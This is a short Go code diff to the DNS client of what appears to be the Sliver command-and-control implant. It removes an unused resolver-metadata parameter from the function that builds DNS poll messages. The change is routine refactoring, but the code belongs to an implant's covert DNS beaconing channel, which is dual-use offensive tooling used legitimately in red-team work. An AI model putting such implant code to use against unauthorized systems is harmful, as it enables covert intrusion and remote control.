@@ -515,8 +515,8 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	log.Printf("[dns] read envelope ...")
 	// {{end}}
 
-	resolver, meta := s.randomResolver()
-	pollMsg, err := s.pollMsg(meta)
+	resolver, _ := s.randomResolver()
+	pollMsg, err := s.pollMsg()
 	if err != nil {
 		return nil, err
 	}
@@ -944,7 +944,7 @@ func (s *SliverDNSClient) joinSubdataToParent(subdata string) (string, error) {
 	return domain, nil
 }
 
-func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
+func (s *SliverDNSClient) pollMsg() (string, error) {
 	nonceBuf := make([]byte, 8)
 	rand.Read(nonceBuf)
 	pollMsg, _ := proto.Marshal(&dnspb.DNSMessage{
